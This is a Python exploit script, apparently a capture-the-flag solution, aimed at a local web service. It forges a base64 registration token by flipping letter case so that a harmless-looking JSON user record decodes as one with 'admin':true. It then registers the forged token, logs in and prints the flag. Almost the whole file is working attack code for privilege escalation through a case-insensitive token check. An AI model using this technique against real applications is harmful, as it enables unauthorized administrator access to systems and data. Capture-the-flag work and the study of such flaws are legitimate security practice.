from pwn import b64e, b64d
import secrets
import requests

class Faker:
    bad = [
    0,  1,  2,  3,  4,  5,  6,  7,  8,
    9, 10, 11, 12, 13, 14, 15, 16, 17,
    18, 19, 20, 21, 22, 23, 24, 25, 26,
    27, 28, 29, 30, 31, 34, 92
    ]

    def make_fake(self, target): 
        letters = b64e(target)
        for i in range(16):
            o = ""
            for j in range(4):
                if i & (1 << j):
                    o += letters[j].upper()
                else:
                    o += letters[j].lower()
            d = b64d(o)
            if all(x not in self.bad for x in d):
                return d
    
    def __init__(self) -> None:
        self.target = b""
        self.safe = b""

    def append(self, s):
        self.target += s
        self.safe += s

    def append_fake(self, s):
        cur_len = len(self.target)
        padding = b" "*((3 - (cur_len % 3)) % 3)
        self.target += padding + s
        self.safe += padding
        for i in range(0, len(s), 3):
            self.safe += self.make_fake(s[i:i+3])

    def append_rev_fake(self, s):
        # I'm too lazy to try and pad it properly so just do it manually
        assert len(self.target) % 3 == 0
        self.target += self.make_fake(s)
        self.safe += s

    def generate(self):
        return b64e(self.safe), b64e(self.target)



faker = Faker()

faker.append(b'{"name":"sshsh')
faker.append_fake(b'", "admin":true, "asb":"')
faker.append(b'","')
faker.append_rev_fake(b"adm")
faker.append(b'in":false}')

safe, malicious = faker.generate()
assert safe.lower() == malicious.lower()


target = 'http://localhost:33336'

password = secrets.token_hex(16).encode()
uname = faker.safe.split(b"\"")[3]

print("Registering with username", uname)

res = requests.post(f"{target}/api/register/1", data={
    "username": b64e(uname)
}).json()

token = res["token"].encode()

assert token == safe.encode()
assert safe.lower() == malicious.lower()

res = requests.post(f"{target}/api/register/2", data={
    "token": b64e(malicious.encode()),
    "password": b64e(password),
}).json()
print("Logging in with password", password)

res = requests.post(f"{target}/api/login", data={
    "username": b64e(b"sshsh "),
    "password": b64e(password),
}).json()

print("flag", res["msg"])
